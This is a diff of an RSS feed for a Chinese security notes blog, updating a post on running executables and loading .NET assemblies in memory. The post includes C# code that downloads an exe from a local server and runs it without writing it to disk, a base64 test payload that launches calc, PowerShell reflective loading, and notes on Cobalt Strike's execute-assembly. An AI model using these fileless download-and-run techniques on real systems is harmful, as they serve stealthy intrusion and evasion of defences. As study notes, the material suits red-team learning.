@@ -6,8 +6,8 @@
     <link>https://echo0d.github.io/DailyNotes/</link>
     <description>echo0d&amp;apos;notes-vuepress</description>
     <language>zh-CN</language>
-    <pubDate>Mon, 09 Dec 2024 05:49:08 GMT</pubDate>
-    <lastBuildDate>Mon, 09 Dec 2024 05:49:08 GMT</lastBuildDate>
+    <pubDate>Mon, 09 Dec 2024 15:28:17 GMT</pubDate>
+    <lastBuildDate>Mon, 09 Dec 2024 15:28:17 GMT</lastBuildDate>
     <generator>@vuepress/plugin-feed</generator>
     <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
     <item>
@@ -4158,13 +4158,14 @@ image-20230614175804223image-...</description>
 PE文件
 
 0. 执行本地文件
-此处以C#和C++为例：AI都会写
+此处以C# C++ Java为例：AI都会写
 exe
 在C#中执行一个.exe文件可以使用Process类，
 而在C++中可以使用CreateProcess函数。
+Java
 dll
 在C#中执行一个.dll文件通常涉及在应用程序中加载并调用该.dll中的函数。
-在C++中执行一个.dll...</description>
+在C+...</description>
       <pubDate>Wed, 13 Nov 2024 10:11:39 GMT</pubDate>
       <content:encoded><![CDATA[
 <p>分两部分：</p>
@@ -4173,7 +4174,7 @@ dll
 <li>PE文件</li>
 </ul>
 <h2>0. 执行本地文件</h2>
-<p>此处以C#和C++为例：AI都会写</p>
+<p>此处以C# C++ Java为例：AI都会写</p>
 <h3>exe</h3>
 <p>在C#中执行一个<code>.exe</code>文件可以使用<code>Process</code>类，</p>
 <div class="language-csharp" data-ext="cs" data-title="cs"><pre class="language-csharp"><code><span class="token keyword">using</span> <span class="token namespace">System</span><span class="token punctuation">;</span>
@@ -4214,6 +4215,22 @@ dll
 
     <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
+</code></pre></div><p>Java</p>
+<div class="language-java" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">exeExecute</span><span class="token punctuation">(</span><span class="token class-name">String</span> filePath<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            <span class="token comment">// 创建进程</span>
+            <span class="token class-name">ProcessBuilder</span> processBuilder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ProcessBuilder</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            processBuilder<span class="token punctuation">.</span><span class="token function">redirectErrorStream</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 合并错误流</span>
+            <span class="token class-name">Process</span> process <span class="token operator">=</span> processBuilder<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+            <span class="token comment">// 等待进程结束</span>
+            <span class="token keyword">int</span> exitCode <span class="token operator">=</span> process<span class="token punctuation">.</span><span class="token function">waitFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Exited with code: "</span> <span class="token operator">+</span> exitCode<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> <span class="token operator">|</span> <span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
 </code></pre></div><h3>dll</h3>
 <p>在C#中执行一个<code>.dll</code>文件通常涉及在应用程序中加载并调用该<code>.dll</code>中的函数。</p>
 <div class="language-csharp" data-ext="cs" data-title="cs"><pre class="language-csharp"><code><span class="token keyword">using</span> <span class="token namespace">System</span><span class="token punctuation">;</span>
@@ -4257,10 +4274,14 @@ dll
 
     <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
-</code></pre></div><h2>1. managed代码内存加载.NET程序集</h2>
+</code></pre></div><p>Java调用第三方dll有点困难，需要dll的源码中实现了JNI方法，此处就不写了。</p>
+<h2>1. managed代码内存加载.NET程序集</h2>
 <p><strong>(Assembly.Load)</strong></p>
 <p>使用C#从内存中加载.NET程序集，直接用<code>Assembly.Load</code>就行了。</p>
+<blockquote>
+<p><a href="https://3gstudent.github.io/%E4%BB%8E%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD.NET%E7%A8%8B%E5%BA%8F%E9%9B%86(Assembly.Load)%E7%9A%84%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90" target="_blank" rel="noopener noreferrer">从内存加载.NET程序集(Assembly.Load)的利用分析</a></p>
 <p><a href="https://learn.microsoft.com/en-us/dotnet/api/system.reflection.assembly.load?view=netframework-4.5" target="_blank" rel="noopener noreferrer">Assembly.Load Method (System.Reflection) | Microsoft Learn</a></p>
+</blockquote>
 <h3>1.1. 三种Load的区别</h3>
 <p><strong><code>Assembly.Load()</code>、<code>Assembly.LoadFrom()</code>和<code>Assembly.LoadFile()</code></strong></p>
 <ul>
@@ -4275,7 +4296,6 @@ dll
 </li>
 </ul>
 <h3>1.2. C#反射加载流程</h3>
-<p><strong>(1) 编写测试程序</strong></p>
 <p>测试程序的代码如下：</p>
 <div class="language-csharp" data-ext="cs" data-title="cs"><pre class="language-csharp"><code><span class="token keyword">using</span> <span class="token namespace">System</span><span class="token punctuation">;</span>
 <span class="token keyword">namespace</span> <span class="token namespace">TestApplication</span>
@@ -4300,7 +4320,8 @@ dll
 </code></pre></div><p>使用csc.exe进行编译：</p>
 <div class="language-text" data-ext="text" data-title="text"><pre class="language-text"><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:testcalc.exe test.cs
 </code></pre></div><p>生成testcalc.exe</p>
-<p><strong>(2) 测试的.exe作base64编码</strong></p>
+<h4>方法1</h4>
+<p><strong>（1）测试的.exe作base64编码</strong></p>
 <p>代码如下：</p>
 <div class="language-csharp" data-ext="cs" data-title="cs"><pre class="language-csharp"><code><span class="token keyword">using</span> <span class="token namespace">System</span><span class="token punctuation">;</span>
 <span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Reflection</span><span class="token punctuation">;</span>
@@ -4317,7 +4338,7 @@ dll
         <span class="token punctuation">}</span>
     <span class="token punctuation">}</span>
 <span class="token punctuation">}</span>
-</code></pre></div><p><strong>(3) 还原.exe的内容</strong></p>
+</code></pre></div><p><strong>（2）还原.exe的内容</strong></p>
 <div class="language-csharp" data-ext="cs" data-title="cs"><pre class="language-csharp"><code><span class="token keyword">using</span> <span class="token namespace">System</span><span class="token punctuation">;</span>
 <span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Reflection</span><span class="token punctuation">;</span>
 <span class="token keyword">namespace</span> <span class="token namespace">TestApplication</span>
@@ -4330,7 +4351,7 @@ dll
             <span class="token class-name"><span class="token keyword">string</span></span> base64str <span class="token operator">=</span> <span class="token string">"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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="</span><span class="token punctuation">;</span>
             <span class="token class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> buffer <span class="token operator">=</span> Convert<span class="token punctuation">.</span><span class="token function">FromBase64String</span><span class="token punctuation">(</span>base64str<span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-</code></pre></div><p><strong>(4) 使用Assembly.Load()加载程序集并调用方法</strong></p>
+</code></pre></div><p><strong>（3）使用Assembly.Load()加载程序集并调用方法</strong></p>
 <p>代码如下：</p>
 <div class="language-csharp" data-ext="cs" data-title="cs"><pre class="language-csharp"><code><span class="token keyword">using</span> <span class="token namespace">System</span><span class="token punctuation">;</span>
 <span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Reflection</span><span class="token punctuation">;</span>
@@ -4365,41 +4386,48 @@ dll
             <span class="token class-name"><span class="token keyword">string</span></span> base64str <span class="token operator">=</span> <span class="token string">"xxxxxx"</span><span class="token punctuation">;</span> <span class="token comment">//此处省略一万字</span>
             <span class="token class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> buffer <span class="token operator">=</span> Convert<span class="token punctuation">.</span><span class="token function">FromBase64String</span><span class="token punctuation">(</span>base64str<span class="token punctuation">)</span><span class="token punctuation">;</span>
 
+            <span class="token comment">// 这里的Assembly.Load可以读取字符串形式的程序集，也就是说exe文件不需要写入硬盘</span>
+            <span class="token class-name">Assembly</span> assembly <span class="token operator">=</span> Assembly<span class="token punctuation">.</span><span class="token function">Load</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token comment">// 以exe为例，如果是dll文件就必须指定类名函数名</span>
+            <span class="token class-name">MethodInfo</span> method <span class="token operator">=</span> assembly<span class="token punctuation">.</span>EntryPoint<span class="token punctuation">;</span>
+            method<span class="token punctuation">.</span><span class="token function">Invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token comment">// 想要指定参数</span>
+            <span class="token comment">// object[] parameters = new[] {"-a","-b"};</span>
+            <span class="token comment">// method.Invoke(null, parameters);</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre></div><h4>方法2</h4>
+<p>远程下载</p>
+<div class="language-csharp" data-ext="cs" data-title="cs"><pre class="language-csharp"><code>	<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">remote</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">MemoryExecutor</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+            <span class="token comment">// 方法1. 把exe文件给base64编码，然后保存在一个常量里, 转成byte数组，放到Assembly.Load函数里</span>
+            <span class="token comment">// string base64String = Constants.Base64Exe;</span>
+            <span class="token comment">// byte[] buffer = Convert.FromBase64String(base64String);</span>
+
+            <span class="token comment">// 方法2. 远程下载exe，赋值给一个字符串类型的变量</span>
+            <span class="token class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> buffer <span class="token operator">=</span> <span class="token function">GetRemoteByte</span><span class="token punctuation">(</span><span class="token string">"http://127.0.0.1:8000/testcalc.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            
             <span class="token class-name">Assembly</span> assembly <span class="token operator">=</span> Assembly<span class="token punctuation">.</span><span class="token function">Load</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
             <span class="token class-name">MethodInfo</span> method <span class="token operator">=</span> assembly<span class="token punctuation">.</span>EntryPoint<span class="token punctuation">;</span>
-            <span class="token comment">// 想要指定参数</span>
-            <span class="token class-name"><span class="token keyword">object</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> parameters <span class="token operator">=</span> <span class="token keyword">new</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span><span class="token string">"-a"</span><span class="token punctuation">,</span><span class="token string">"-b"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
-            method<span class="token punctuation">.</span><span class="token function">Invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> parameters<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            method<span class="token punctuation">.</span><span class="token function">Invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token punctuation">}</span>
-    <span class="token punctuation">}</span>
-<span class="token punctuation">}</span>
-</code></pre></div><h3>1.3. 示例代码</h3>
-<h4>c#</h4>
-<div class="language-csharp" data-ext="cs" data-title="cs"><pre class="language-csharp"><code><span class="token keyword">using</span> <span class="token namespace">System</span><span class="token punctuation">;</span>
-<span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>IO</span><span class="token punctuation">;</span>
-<span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Reflection</span><span class="token punctuation">;</span>
-
-<span class="token keyword">namespace</span> <span class="token namespace">MemoryLoadApplication</span>
-<span class="token punctuation">{</span>
-
-    <span class="token keyword">class</span> <span class="token class-name">Program</span>
-    <span class="token punctuation">{</span>
-
-        <span class="token keyword">static</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> args<span class="token punctuation">)</span>
+        
+        
+        <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token return-type class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> <span class="token function">GetRemoteByte</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">string</span></span> serviceUrl<span class="token punctuation">)</span>
         <span class="token punctuation">{</span>
-
-            <span class="token class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> buffer <span class="token operator">=</span> File<span class="token punctuation">.</span><span class="token function">ReadAllBytes</span><span class="token punctuation">(</span><span class="token string">@"C:\Users\Black Sheep\source\repos\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token class-name"><span class="token keyword">string</span></span> base64str <span class="token operator">=</span> Convert<span class="token punctuation">.</span><span class="token function">ToBase64String</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token class-name"><span class="token keyword">string</span></span> dir <span class="token operator">=</span> Directory<span class="token punctuation">.</span><span class="token function">GetCurrentDirectory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            buffer <span class="token operator">=</span> Convert<span class="token punctuation">.</span><span class="token function">FromBase64String</span><span class="token punctuation">(</span>base64str<span class="token punctuation">)</span><span class="token punctuation">;</span>
-            File<span class="token punctuation">.</span><span class="token function">WriteAllText</span><span class="token punctuation">(</span><span class="token interpolation-string"><span class="token string">$"</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token expression language-csharp">dir</span><span class="token punctuation">}</span></span><span class="token string">\\base64.txt"</span></span><span class="token punctuation">,</span> base64str<span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token class-name">Assembly</span> assembly <span class="token operator">=</span> System<span class="token punctuation">.</span>Reflection<span class="token punctuation">.</span>Assembly<span class="token punctuation">.</span><span class="token function">Load</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
-            assembly<span class="token punctuation">.</span>EntryPoint<span class="token punctuation">.</span><span class="token function">Invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name"><span class="token keyword">object</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> <span class="token punctuation">{</span> args <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
+            <span class="token class-name">WebClient</span> client <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">WebClient</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> buffer <span class="token operator">=</span> client<span class="token punctuation">.</span><span class="token function">DownloadData</span><span class="token punctuation">(</span>serviceUrl<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">return</span> buffer<span class="token punctuation">;</span>
         <span class="token punctuation">}</span>
+        
     <span class="token punctuation">}</span>
-<span class="token punctuation">}</span>
-</code></pre></div><h4>powershell</h4>
+</code></pre></div><h3>1.3. powershell</h3>
+<blockquote>
+<p>https://idiotc4t.com/code-and-dll-process-injection/.net-fan-she-jia-zai</p>
+</blockquote>
 <p>powershell访问.net程序集的代码比较简单</p>
 <div class="language-powershell" data-ext="powershell" data-title="powershell"><pre class="language-powershell"><code><span class="token variable">$base64</span> = <span class="token string">"TVqQAAMAAAAEAAA(前面生成的base64编码的程序集)"</span><span class="token punctuation">;</span>
 <span class="token variable">$bins</span>  = <span class="token namespace">[System.Convert]</span>::FromBase64String<span class="token punctuation">(</span><span class="token variable">$base64</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -4450,7 +4478,7 @@ dll
 <figure><a href="https://0pen1.github.io/2022/02/09/net%E7%A8%8B%E5%BA%8F%E9%9B%86%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E6%89%A7%E8%A1%8C%E6%8A%80%E6%9C%AF/net%E7%A8%8B%E5%BA%8F%E9%9B%86%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E6%89%A7%E8%A1%8C%E6%8A%80%E6%9C%AF.assets/image-20220114182430780-16443915545351.png" target="_blank" rel="noopener noreferrer"></a><figcaption>image-20220114182430780</figcaption></figure>
 <p>我们继续跟进ExecuteAssembly方法，ExecuteAssembly方法有两个参数，第一个参数为待执行的.net程序集路径，第二个参数为.net程序集执行需要的参数。执行这个方法时先将要执行的.net程序集从硬盘读取并加载到PE解析器（PEParser）中，随后判断加载的PE文件是否为.net程序集，如果是.net程序集则创建ExecuteAssemblyJob实例并调用spawn方法。</p>
 <figure><a href="https://0pen1.github.io/2022/02/09/net%E7%A8%8B%E5%BA%8F%E9%9B%86%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E6%89%A7%E8%A1%8C%E6%8A%80%E6%9C%AF/net%E7%A8%8B%E5%BA%8F%E9%9B%86%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E6%89%A7%E8%A1%8C%E6%8A%80%E6%9C%AF.assets/image-20220114182256752.png" target="_blank" rel="noopener noreferrer"></a><figcaption>image-20220114182256752</figcaption></figure>
-<p>接下来进入spawn方法，可以看到是<strong>通过反射DLL的方法，将invokeassembly.dll注入到进程当中</strong>（这块也不知道咋实现的），并且设置任务号为70（x86版本）或者71（x64）。注入的invokeassembly.dll在其内存中创建CLR环境，然后通过管道再将C#可执行文件读取到内存中,最后执行。</p>
+<p>接下来进入spawn方法，可以看到是<strong>通过反射DLL的方法，将invokeassembly.dll注入到进程当中</strong>（这块还没自己实现过），并且设置任务号为70（x86版本）或者71（x64）。注入的invokeassembly.dll在其内存中创建CLR环境，然后通过管道再将C#可执行文件读取到内存中,最后执行。</p>
 <div class="language-java" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">spawn</span><span class="token punctuation">(</span><span class="token class-name">String</span> var1<span class="token punctuation">)</span> <span class="token punctuation">{</span>
